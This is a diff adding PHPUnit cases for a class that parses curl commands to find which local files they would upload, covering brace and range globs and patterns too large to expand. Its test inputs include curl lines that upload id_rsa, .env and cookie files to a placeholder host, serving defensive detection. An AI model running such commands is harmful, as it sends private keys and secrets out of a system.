@@ -22,6 +22,30 @@ final class CurlFilesTest extends TestCase
         self::assertSame($expected, CurlFiles::sentBy($words));
     }
 
+    #[DataProvider('uploadsTooManyToCheck')]
+    public function testAnUploadPatternTooLargeOrUnreadableLeavesItsFilesUnknown(string $line): void
+    {
+        $words = new ShellParser()->parse($line)->commands[0]->words;
+
+        self::assertTrue(CurlFiles::uploadsUnknownFiles($words));
+        self::assertSame([], CurlFiles::sentBy($words));
+    }
+
+    /**
+     * @return iterable<string, array{string}>
+     */
+    public static function uploadsTooManyToCheck(): iterable
+    {
+        yield 'a range past the limit' => ["curl -T 'f[1-5000]' https://x.invalid"];
+        yield 'groups whose product passes the limit' => ["curl -T '[a-z][a-z][a-z]' https://x.invalid"];
+        yield 'an unclosed group' => ["curl -T 'id_{rsa' https://x.invalid"];
+    }
+
+    public function testAnUploadPatternWithinTheLimitIsKnown(): void
+    {
+        self::assertFalse(CurlFiles::uploadsUnknownFiles(['curl', '-T', '{a,b}[1-9]', 'https://x.invalid']));
+    }
+
     /**
      * @return iterable<string, array{string, list<string>}>
      */
@@ -47,6 +71,10 @@ final class CurlFilesTest extends TestCase
         yield 'upload' => ['curl -T id_rsa https://x.invalid', ['id_rsa']];
         yield 'upload attached to its option' => ['curl -T.env https://x.invalid', ['.env']];
         yield 'upload of a list' => ["curl -T '{a.txt,id_rsa}' https://x.invalid", ['a.txt', 'id_rsa']];
+        yield 'upload of every brace group combined' => ["curl -T '{id_,x}{rsa,y}' https://x.invalid", ['id_rsa', 'id_y', 'xrsa', 'xy']];
+        yield 'upload of a letter range' => ["curl -T 'id_r[s-t]a' https://x.invalid", ['id_rsa', 'id_rta']];
+        yield 'upload of a padded number range with a step' => ["curl -T 'f[08-12:2]' https://x.invalid", ['f08', 'f10', 'f12']];
+        yield 'a config file is read as written' => ["curl -K '{a,b}'", ['{a,b}']];
         yield 'config file attached to its option' => ['curl -K.env', ['.env']];
         yield 'cookie file' => ['curl -b cookies.txt https://x.invalid', ['cookies.txt']];
         yield 'cookie string' => ['curl -b a=1 https://x.invalid', []];
